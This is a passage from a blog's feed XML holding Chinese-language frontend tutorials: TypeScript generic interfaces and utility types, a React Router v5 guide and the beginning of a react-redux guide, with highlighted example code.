class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj: IdFunc&lt;<span class="built_in">number</span>&gt; = &#123;</span><br><span class="line">  id(value) &#123;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">  &#125;,</span><br><span class="line">  ids() &#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>];</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>解释：</p><ol><li>在接口名称的后面添加 <code>&lt;类型变量&gt;</code>，那么，这个接口就变成了泛型接口。</li><li>接口的类型变量，对接口中所有其他成员可见，也就是<strong>接口中所有成员都可以使用类型变量</strong>。</li><li>使用泛型接口时，<strong>需要显式指定具体的类型</strong>(比如，此处的 IdFunc)。</li><li>此时，id 方法的参数和返回值类型都是 number;ids 方法的返回值类型是 number[]。</li></ol><p>实际上，JS 中的数组在 TS 中就是一个泛型接口</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> strs = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>];</span><br><span class="line"><span class="comment">// 鼠标放在 forEach 上查看类型</span></span><br><span class="line">strs.forEach;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> nums = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>];</span><br><span class="line"><span class="comment">// 鼠标放在 forEach 上查看类型</span></span><br><span class="line">nums.forEach;</span><br></pre></td></tr></table></figure><ul><li>解释:当我们在使用数组时，TS 会根据数组的不同类型，来自动将类型变量设置为相应的类型</li><li>技巧:可以通过 Ctrl + 鼠标左键(Mac：Command + 鼠标左键)来查看具体的类型信息</li></ul><h2 id="泛型工具类型"><a href="#泛型工具类型" class="headerlink" title="泛型工具类型"></a>泛型工具类型</h2><p>泛型工具类型：TS 内置了一些常用的工具类型，来简化 TS 中的一些常见操作</p><p>说明：它们都是基于泛型实现的(泛型适用于多种类型，更加通用)，并且是内置的，可以直接在代码中使用。 这些工具类型有很多，主要学习以下几个:</p><ol><li><code>Partial&lt;Type&gt;</code></li><li><code>Readonly&lt;Type&gt;</code></li><li><code>Pick&lt;Type, Keys&gt;</code></li></ol><ul><li><a href="https://www.typescriptlang.org/docs/handbook/utility-types.html" target="_blank" rel="noopener">TS 所有内置的泛型工具类型文档</a></li></ul><h3 id="Partial"><a href="#Partial" class="headerlink" title="Partial"></a>Partial</h3><ul><li>Partial 用来构造(创建)一个类型，将 Type 的所有属性设置为可选。</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Props = &#123;</span><br><span class="line">  id: <span class="built_in">string</span>;</span><br><span class="line">  children: <span class="built_in">number</span>[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> PartialProps = Partial&lt;Props&gt;;</span><br></pre></td></tr></table></figure><ul><li>解释:构造出来的新类型 PartialProps 结构和 Props 相同，但所有属性都变为可选的。</li></ul><h3 id="Readonly"><a href="#Readonly" class="headerlink" title="Readonly"></a>Readonly</h3><ul><li>Readonly 用来构造一个类型，将 Type 的所有属性都设置为 readonly(只读)。</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Props = &#123;</span><br><span class="line">  id: <span class="built_in">string</span>;</span><br><span class="line">  children: <span class="built_in">number</span>[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ReadonlyProps = Readonly&lt;Props&gt;;</span><br></pre></td></tr></table></figure><ul><li>解释:构造出来的新类型 ReadonlyProps 结构和 Props 相同，但所有属性都变为只读的。</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> props: ReadonlyProps = &#123; id: <span class="string">'1'</span>, children: [] &#125;;</span><br><span class="line"><span class="comment">// 错误演示</span></span><br><span class="line">props.id = <span class="string">'2'</span>;</span><br></pre></td></tr></table></figure><ul><li>当我们想重新给 id 属性赋值时，就会报错:无法分配到 “id” ，因为它是只读属性。</li></ul><h3 id="Pick"><a href="#Pick" class="headerlink" title="Pick"></a>Pick</h3><ul><li>Pick<type, keys=""> 从 Type 中选择一组属性来构造新类型。</type,></li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Props &#123;</span><br><span class="line">  id: <span class="built_in">string</span>;</span><br><span class="line">  title: <span class="built_in">string</span>;</span><br><span class="line">  children: <span class="built_in">number</span>[];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> PickProps = Pick&lt;Props, <span class="string">'id'</span> | <span class="string">'title'</span>&gt;;</span><br></pre></td></tr></table></figure><ul><li>解释:<ol><li>Pick 工具类型有两个类型变量:1 表示选择谁的属性 2 表示选择哪几个属性。</li><li>其中第二个类型变量，如果只选择一个则只传入该属性名即可，如果有多个使用联合类型即可。</li><li>第二个类型变量传入的属性只能是第一个类型变量中存在的属性。</li><li>构造出来的新类型 PickProps，只有 id 和 title 两个属性类型。</li></ol></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;TypeScript-高级类型&quot;&gt;&lt;a href=&quot;#TypeScript-高级类型&quot; class=&quot;headerlink&quot; title=&quot;TypeScript 高级类型&quot;&gt;&lt;/a&gt;TypeScript 高级类型&lt;/h1&gt;&lt;h2 id=&quot;TS-中的类型兼容性&quot;&gt;&lt;
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="TypeScript" scheme="//www.shen.ee/tags/TypeScript/"/>
    
      <category term="ts" scheme="//www.shen.ee/tags/ts/"/>
    
      <category term="TypeScript高级类型" scheme="//www.shen.ee/tags/TypeScript%E9%AB%98%E7%BA%A7%E7%B1%BB%E5%9E%8B/"/>
    
      <category term="ts泛型" scheme="//www.shen.ee/tags/ts%E6%B3%9B%E5%9E%8B/"/>
    
  </entry>
  
  <entry>
    <title>React系列学习教程合集</title>
    <link href="//www.shen.ee/article/16686.html"/>
    <id>//www.shen.ee/article/16686.html</id>
    <published>2022-06-15T04:38:39.000Z</published>
    <updated>2022-06-22T06:24:25.997Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>算是一个简单的系列合集笔记记录，温度而知新</p></blockquote><ol><li><a href="https://www.iyouhun.com/post-221.html" target="_blank" rel="noopener">React快速上手</a></li><li><a href="https://www.iyouhun.com/post-222.html" target="_blank" rel="noopener">JSX语法学习</a></li><li><a href="https://www.iyouhun.com/post-223.html" target="_blank" rel="noopener">React组件基础</a></li><li><a href="https://www.iyouhun.com/post-224.html" target="_blank" rel="noopener">React组件通讯</a></li><li><a href="https://www.iyouhun.com/post-225.html" target="_blank" rel="noopener">React组件进阶及生命周期</a></li><li><a href="https://www.iyouhun.com/post-226.html" target="_blank" rel="noopener">深入浅出Hooks</a></li><li><a href="https://www.iyouhun.com/post-227.html" target="_blank" rel="noopener">Redux状态管理工具学习</a></li><li><a href="https://www.iyouhun.com/post-228.html" target="_blank" rel="noopener">react-redux学习</a></li><li><a href="https://www.iyouhun.com/post-229.html" target="_blank" rel="noopener">React路由</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;算是一个简单的系列合集笔记记录，温度而知新&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://www.iyouhun.com/post-221.html&quot; target=&quot;_blank&quot; rel=&quot;noopen
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="React" scheme="//www.shen.ee/tags/React/"/>
    
      <category term="React学习" scheme="//www.shen.ee/tags/React%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>React路由</title>
    <link href="//www.shen.ee/article/6674.html"/>
    <id>//www.shen.ee/article/6674.html</id>
    <published>2022-06-15T04:38:39.000Z</published>
    <updated>2022-06-22T06:24:26.002Z</updated>
    
    <content type="html"><![CDATA[<h2 id="React路由-基本使用"><a href="#React路由-基本使用" class="headerlink" title="React路由-基本使用"></a>React路由-基本使用</h2><blockquote><p>这里使用最广泛的 v5 版本，<a href="https://v5.reactrouter.com/" target="_blank" rel="noopener">v5 文档</a>、 <a href="https://react-router.docschina.org/web/guides/philosophy" target="_blank" rel="noopener">v5 中文文档</a></p><p>注意：v6 版本相比 v5 版本有破坏性更新！ <a href="https://reactrouter.com/" target="_blank" rel="noopener">v6 文档</a></p></blockquote><p><strong>步骤</strong>：</p><ol><li>安装：<code>yarn add react-router-dom@5.3.0</code></li><li>导入路由的三个核心组件：Router / Route / Link</li><li>使用 Router 组件包裹整个应用</li><li>使用 Link 组件作为导航菜单（路由入口）</li><li>使用 Route 组件配置路由规则和要展示的组件（路由出口）</li></ol><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; BrowserRouter <span class="keyword">as</span> Router, Route, Link &#125; <span class="keyword">from</span> <span class="string">'react-router-dom'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> First = <span class="function"><span class="params">()</span> =&gt;</span> &lt;p&gt;页面一的页面内容&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">const App = () =&gt; &#123;</span></span><br><span class="line"><span class="regexp">  return (</span></span><br><span class="line"><span class="regexp">    &lt;Router&gt;</span></span><br><span class="line"><span class="regexp">      &lt;div className="App"&gt;</span></span><br><span class="line"><span class="regexp">        &lt;ul&gt;</span></span><br><span class="line"><span class="regexp">          &lt;li&gt;</span></span><br><span class="line"><span class="regexp">            &#123;/</span>*</span><br><span class="line">              to属性：浏览器地址栏中的pathname（location.pathname）</span><br><span class="line">            *<span class="regexp">/&#125;</span></span><br><span class="line"><span class="regexp">            &lt;Link to="/</span>first<span class="string">"&gt;页面一&lt;/Link&gt;</span></span><br><span class="line"><span class="string">          &lt;/li&gt;</span></span><br><span class="line"><span class="string">        &lt;/ul&gt;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        &#123;/*</span></span><br><span class="line"><span class="string">          path属性：路由规则</span></span><br><span class="line"><span class="string">          component属性：展示的组件</span></span><br><span class="line"><span class="string">          Route 组件写在哪，渲染出来的组件就展示在哪</span></span><br><span class="line"><span class="string">        */&#125;</span></span><br><span class="line"><span class="string">        &lt;Route path="</span>/first<span class="string">" component=&#123;First&#125;&gt;&lt;/Route&gt;</span></span><br><span class="line"><span class="string">      &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/Router&gt;</span></span><br><span class="line"><span class="string"> )</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="React路由-Router模式"><a href="#React路由-Router模式" class="headerlink" title="React路由-Router模式"></a>React路由-Router模式</h2><ul><li><p>Router 组件：包裹整个应用，一个 React 应用只需要使用一次</p></li><li><p>两种常用 Router：<code>HashRouter</code> 和 <code>BrowserRouter</code></p></li><li><p>HashRouter：使用 URL 的哈希值实现（</p><p><a href="http://localhost:3000/#/first）" target="_blank" rel="noopener">http://localhost:3000/#/first）</a></p><ul><li>原理：监听 window 的 <code>hashchange</code> 事件来实现的</li></ul></li><li><p>（推荐）</p><p>BrowserRouter</p><p>：使用 H5 的 history.pushState() API 实现（</p><p><a href="http://localhost:3000/first）" target="_blank" rel="noopener">http://localhost:3000/first）</a></p><ul><li>原理：监听 window 的 <code>popstate</code> 事件来实现的</li></ul></li></ul><h2 id="React路由-Link-amp-NavLink组件"><a href="#React路由-Link-amp-NavLink组件" class="headerlink" title="React路由-Link&amp;NavLink组件"></a>React路由-Link&amp;NavLink组件</h2><p><code>Link</code> 组件：用于指定导航链接，会渲染成 a 标签</p><ul><li><code>to</code> 属性，将来会渲染成 a 标签的 href 属性</li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Link to=<span class="string">"/first"</span>&gt;页面一&lt;<span class="regexp">/Link&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ 渲染为：</span></span><br><span class="line"><span class="regexp">&lt;a href="/</span>first<span class="string">"&gt;页面一&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p>除了 Link 组件外，路由库中还提供了 <code>NavLink</code> 组件，可以在路由匹配时获得一个高亮类名，从而指定高亮效果（样式需要自己手动指定）</p><ul><li><p>使用方式同 Link 组件，只是额外获得一个高亮类名</p></li><li><p><code>activeClassName</code> 属性：用于指定高亮的类名，默认 <code>active</code></p></li><li><p><code>exact</code>属性：精确匹配，表示必须精确匹配（to 属性值和浏览器地址栏中的 pathname 相同），类名才生效</p><ul><li>默认情况下，React 路由中的 NavLink 的 to 属性在匹配的时候，默认是 <strong>模糊匹配</strong></li><li><strong>模糊匹配</strong>，表示：只要 浏览器地址栏中的 patchname（比如：/search/a）是以 NavLink to（/search） 属性的值开头的，此时，就会匹配成功</li></ul></li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;NavLink to=<span class="string">"/first"</span>&gt;页面一&lt;<span class="regexp">/NavLink&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ 渲染为：</span></span><br><span class="line"><span class="regexp">&lt;a href="/</span>first<span class="string">" class="</span>active<span class="string">"&gt;页面一&lt;/a&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// ---</span></span><br><span class="line"><span class="string">// Link 的模糊匹配和精确匹配</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 模糊匹配：</span></span><br><span class="line"><span class="string">// 浏览器地址栏中的 pathname 为：/search/a</span></span><br><span class="line"><span class="string">// 匹配成功的 to 属性为：</span></span><br><span class="line"><span class="string">// 1 /search ==&gt; 模糊匹配成功</span></span><br><span class="line"><span class="string">// 2 /search/a==&gt; 完全相同，匹配成功</span></span><br><span class="line"><span class="string">// 3 /sear==&gt; 匹配失败，因为 /search 是一块完整的内容，必须要出现这一整块内容才可以</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 精确匹配：</span></span><br><span class="line"><span class="string">// 浏览器地址栏中的 pathname 为：/search/a</span></span><br><span class="line"><span class="string">// 注意：添加 exact 属性后，变为精确匹配，此时，这个 NavLink 只能匹配 /search 这一个 patchname 了</span></span><br><span class="line"><span class="string">// React 中如果属性是 布尔值 可以只写属性名称，不用写后面的 = 等内容</span></span><br><span class="line"><span class="string">&lt;NavLink exact to="</span>/search<span class="string">"&gt;search 页面&lt;/NavLink&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 等价于：</span></span><br><span class="line"><span class="string">&lt;NavLink exact=&#123;true&#125; to="</span>/search<span class="string">"&gt;search 页面&lt;/NavLink&gt;</span></span><br></pre></td></tr></table></figure><h2 id="React路由-Route组件"><a href="#React路由-Route组件" class="headerlink" title="React路由-Route组件"></a>React路由-Route组件</h2><p><code>Route</code> 组件：用来配置路由规则</p><ul><li><code>path</code> 属性，指定路由规则</li><li><code>component</code> 属性，指定要渲染的组件</li><li><code>children</code> 子节点，指定要渲染的组件</li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用法一：使用 component 属性指定要渲染的组件</span></span><br><span class="line">&lt;Route path=<span class="string">"/search"</span> component=&#123;Search&#125; /&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用法二：使用 children 指定要渲染的组件</span></span><br><span class="line">&lt;Route path=<span class="string">"/search"</span>&gt;</span><br><span class="line">&lt;Search /&gt;</span><br><span class="line">&lt;<span class="regexp">/Route&gt;</span></span><br></pre></td></tr></table></figure><p>注意：对于 Route 来说，如果路由规则匹配成功，那么，就会渲染对应组件；否则，渲染 null 或者说不渲染任何内容</p><p>对于 Route 组件来说，<code>path</code> 属性是可选的：</p><ul><li>如果 Route 组件没有 path 属性，表示：该路由永远匹配成功，一定会渲染该组件</li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Route&gt;</span><br><span class="line">&lt;SomeComponent /&gt;</span><br><span class="line">&lt;<span class="regexp">/Route&gt;</span></span><br></pre></td></tr></table></figure><h2 id="React路由-路由匹配模式"><a href="#React路由-路由匹配模式" class="headerlink" title="React路由-路由匹配模式"></a>React路由-路由匹配模式</h2><p>路由有两种匹配模式：1 模糊匹配（默认）, 2 精确匹配</p><p><strong>模糊匹配</strong></p><ul><li>问题：当 Link组件的 to 属性值为 “/login”时，为什么 默认路由 也被匹配成功?</li><li>默认情况下，React 路由是<strong>模糊匹配</strong>模式</li><li>模糊匹配规则：只要 pathname（浏览器地址栏中的地址） 以 path 开头就会匹配成功</li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Link to=<span class="string">"/login"</span>&gt;登录页面&lt;<span class="regexp">/Link&gt;</span></span><br><span class="line"><span class="regexp">&lt;Route path="/</span><span class="string">" component=&#123;Home&#125; /&gt; 匹配成功</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// pathname 代表Link组件的to属性（也就是 location.pathname）</span></span><br><span class="line"><span class="string">// path 代表Route组件的path属性</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>path</th><th>能够匹配的pathname（浏览器地址栏）</th></tr></thead><tbody><tr><td>/</td><td>所有 pathname</td></tr><tr><td>/first</td><td>/first 或 /first/a 或 /first/a/b/…</td></tr></tbody></table><p><strong>精确匹配</strong></p><ul><li>问题：默认路由任何情况下都会展示，如何避免这种问题?</li><li>给 Route 组件添加 <code>exact</code> 属性，让其变为<strong>精确匹配</strong>模式</li><li>精确匹配：只有当 path 和 pathname 完全匹配时才会展示该路由</li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 此时，该组件只能匹配 pathname=“/” 这一种情况 </span></span><br><span class="line">&lt;Route exact path=<span class="string">"/"</span> component=... /&gt;</span><br></pre></td></tr></table></figure><h2 id="React路由-执行过程"><a href="#React路由-执行过程" class="headerlink" title="React路由-执行过程"></a>React路由-执行过程</h2><p>切换页面时，执行过程如下：</p><ol><li>点击 Link 组件（a标签），修改了浏览器地址栏中的 url</li><li>React 路由监听到地址栏 url 的变化 hashchange popstate</li><li>React 路由内部遍历所有 Route 组件，使用路由规则（path）与 pathname（hash）进行匹配</li><li>当路由规则（path）能够匹配地址栏中的 pathname（hash） 时，就展示该 Route 组件的内容</li></ol><p>注意：默认情况下，<strong>React 路由可以同时匹配成功多个</strong>，只要匹配成功，该路由组件对应的内容就会渲染到页面中</p><h2 id="React路由-Switch组件-amp-404页面"><a href="#React路由-Switch组件-amp-404页面" class="headerlink" title="React路由-Switch组件&amp;404页面"></a>React路由-Switch组件&amp;404页面</h2><p><code>Switch</code> 组件：包裹 Route 组件，<strong>只会渲染第一个匹配的组件</strong>，即使有多个路由都可以匹配成功</p><ul><li>在实际开发时，通常会用 <code>Switch</code> 组件包裹 <code>Route</code> 组件</li><li>通过 <code>Switch</code> 组件非常容易的就能实现 404 页面功能：</li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;Switch&gt;</span><br><span class="line">  &lt;Route exact path=<span class="string">"/"</span>&gt;</span><br><span class="line">  &lt;Home /&gt;</span><br><span class="line">  &lt;<span class="regexp">/Route&gt;</span></span><br><span class="line"><span class="regexp">  &lt;Route path="/</span>about<span class="string">"&gt;</span></span><br><span class="line"><span class="string">  &lt;About /&gt;</span></span><br><span class="line"><span class="string">  &lt;/Route&gt;</span></span><br><span class="line"><span class="string">  &lt;Route path="</span>/user<span class="string">"&gt;</span></span><br><span class="line"><span class="string">  &lt;User /&gt;</span></span><br><span class="line"><span class="string">  &lt;/Route&gt;</span></span><br><span class="line"><span class="string">  // 即使这个也可以匹配成功 /user/a 但是因为 Switch 组件的存在，这个路由对应的组件内容是不会渲染的</span></span><br><span class="line"><span class="string">  &lt;Route path="</span>/user/a<span class="string">"&gt;</span></span><br><span class="line"><span class="string">  &lt;User1 /&gt;</span></span><br><span class="line"><span class="string">  &lt;/Route&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;/* 以上路由规则全都不匹配时，展示 404 页面 */&#125;</span></span><br><span class="line"><span class="string">  &#123;/* 注意：这个路由需要放在最后，兜底 */&#125;</span></span><br><span class="line"><span class="string">  &lt;Route&gt;</span></span><br><span class="line"><span class="string">  &lt;NoMatch /&gt;</span></span><br><span class="line"><span class="string">  &lt;/Route&gt;</span></span><br><span class="line"><span class="string">&lt;/Switch&gt;</span></span><br></pre></td></tr></table></figure><h2 id="React路由-编程式导航"><a href="#React路由-编程式导航" class="headerlink" title="React路由-编程式导航"></a>React路由-编程式导航</h2><ul><li><p>场景：点击登录按钮，登录成功后，通过代码跳转到后台首页，如何实现？</p></li><li><p>编程式导航：通过 JS 代码来实现页面跳转</p></li><li><p>可以通过<code>useHistory</code>hook 来拿到路由提供的 history 对象，用于获取浏览器历史记录的相关信息。常用操作：</p><ul><li><code>push(path)</code>：跳转到某个页面，参数 path 表示要跳转的路径</li><li><code>replace(patch)</code>：跳转到某个页面，会替换当前的历史记录</li><li><code>go(n)</code>： 前进或后退到某个页面，参数 n 表示前进或后退页面数量（比如：-1 表示后退到上一页）</li></ul></li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useHistory &#125; <span class="keyword">from</span> <span class="string">'react-router-dom'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Login = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> history = useHistory()</span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> onLogin = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    history.push(<span class="string">'/home'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">  &lt;button onClick=&#123;onLogin&#125;&gt;登录&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">  )</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><p><strong><code>push(path)</code>和 <code>replace(path)</code> 跳转路由的区别</strong>：</p><p>浏览器会自动记录访问过来的页面路径，可以简单的把理解为通过一个 数组 来记录的。</p><p>比如：我们访问了 3 个页面：[‘/login’, ‘/home’, ‘/search’]，当前所在页面为：’/search’</p><ol><li>此时，如果我们又通过 <code>push(&#39;/a&#39;)</code> 方法访问了一个新页面：’/a’，此时，就相当于往数组中 push 了一条数据，<ul><li>那么，访问该页面后，浏览器中的记录为：[‘/login’, ‘/home’, ‘/search’, ‘/a’]</li></ul></li><li>此时，如果我们又通过 <code>replace(&#39;/a&#39;)</code> 方法访问了一个新页面：’/a’，此时，就相当于把当前页面地址，替换为 ‘/a’<ul><li>那么，访问该页面后，浏览器中的记录为：[‘/login’, ‘/home’, ‘/a’]</li></ul></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;React路由-基本使用&quot;&gt;&lt;a href=&quot;#React路由-基本使用&quot; class=&quot;headerlink&quot; title=&quot;React路由-基本使用&quot;&gt;&lt;/a&gt;React路由-基本使用&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;这里使用最广泛的 v5 版本，&lt;a
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="React路由" scheme="//www.shen.ee/tags/React%E8%B7%AF%E7%94%B1/"/>
    
      <category term="react-router-dom" scheme="//www.shen.ee/tags/react-router-dom/"/>
    
  </entry>
  
  <entry>
    <title>react-redux学习</title>
    <link href="//www.shen.ee/article/57549.html"/>
    <id>//www.shen.ee/article/57549.html</id>
    <published>2022-06-15T04:38:39.000Z</published>
    <updated>2022-06-22T06:24:26.008Z</updated>
    
    <content type="html"><![CDATA[<h1 id="React-Redux介绍"><a href="#React-Redux介绍" class="headerlink" title="React-Redux介绍"></a>React-Redux介绍</h1><p>为什么要使用 React-Redux 绑定库?</p><p>React 和 Redux 是两个独立的库，两者之间职责独立。因此，为了实现在 React 中使用 Redux 进行状态管理 ，就需要一种机制，将这两个独立的库关联在一起。这时候就用到 React-Redux 这个绑定库了。</p><ul><li>作用：<strong>为 React 接入 Redux，实现在 React 中使用 Redux 进行状态管理</strong>。</li><li>react-redux 库是 Redux 官方提供的 React 绑定库。</li></ul><p><img src="https://oss.iyouhun.com/img/md/react-redux.443f85c0.jpeg" alt="react-redux.443f85c0"></p><h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><p><a href="https://react-redux.js.org/introduction/getting-started" target="_blank" rel="noopener">react-redux 文档</a></p><p>react-redux 的使用分为两大步：1 全局配置（只需要配置一次） 2 组件接入（获取状态或修改状态）</p><p>先看全局配置：</p><p><strong>步骤</strong>：</p><ol><li>安装 react-redux：<code>yarn add react-redux</code></li><li>从 react-redux 中导入 Provider 组件</li><li>导入创建好的 redux 仓库</li><li>使用 Provider 包裹整个应用</li><li>将导入的 store 设置为 Provider 的 store 属性值</li></ol><p><strong>核心代码</strong>：</p><p>src/index.js 中：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 导入 Provider 组件</span></span><br><span class="line"><span class="keyword">import</span> &#123; Provider &#125; <span class="keyword">from</span> <span class="string">'react-redux'</span></span><br><span class="line"><span class="comment">// 导入创建好的 store</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">'./store'</span></span><br><span class="line"><span class="keyword">const</span> root = ReactDOM.createRoot(<span class="built_in">document</span>.querySelector(<span class="string">'#root'</span>))</span><br><span class="line">root.render(</span><br><span class="line">  &lt;Provider 